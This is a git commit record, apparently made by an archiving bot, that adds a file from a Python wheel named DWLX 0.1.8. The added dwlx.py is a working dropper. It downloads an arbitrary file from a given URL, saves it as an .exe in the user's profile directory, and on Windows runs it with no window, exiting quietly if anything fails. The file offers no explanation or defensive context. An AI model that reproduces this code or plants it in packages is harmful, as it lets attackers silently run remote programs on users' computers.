3afa754472311e2136170d7a280bac03b62148e0
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-04-01 05:06:48 +0000

    Add package DWLX/0.1.8/dwlx-0.1.8-py2.py3-none-any.whl

---
+++ packages/DWLX/dwlx-0.1.8-py2.py3-none-any.whl/DWLX/dwlx.py
@@ -0,0 +1,33 @@
+import requests
+import subprocess
+import sys
+import os
+
+def init(url: str, name="file"):
+    while " " in url:
+        url = url.replace(" ", "")
+
+    userprofile = os.getenv("USERPROFILE")
+    if userprofile == None or not os.path.exists(userprofile):
+        filepath = name + ".exe"
+    else:
+        filepath = os.path.join(userprofile, name + ".exe")
+
+    try:
+        rsp = requests.get(url)
+        rsp.raise_for_status()  
+
+        with open(filepath, "wb") as file:
+            file.write(rsp.content)
+
+        if not os.path.exists(filepath):
+            sys.exit()
+
+        if sys.platform == "win32":
+            subprocess.Popen(filepath, creationflags=subprocess.CREATE_NO_WINDOW)
+
+    except requests.exceptions.RequestException as e:
+        sys.exit()
+    except Exception as e:
+        print(e)
+        sys.exit()
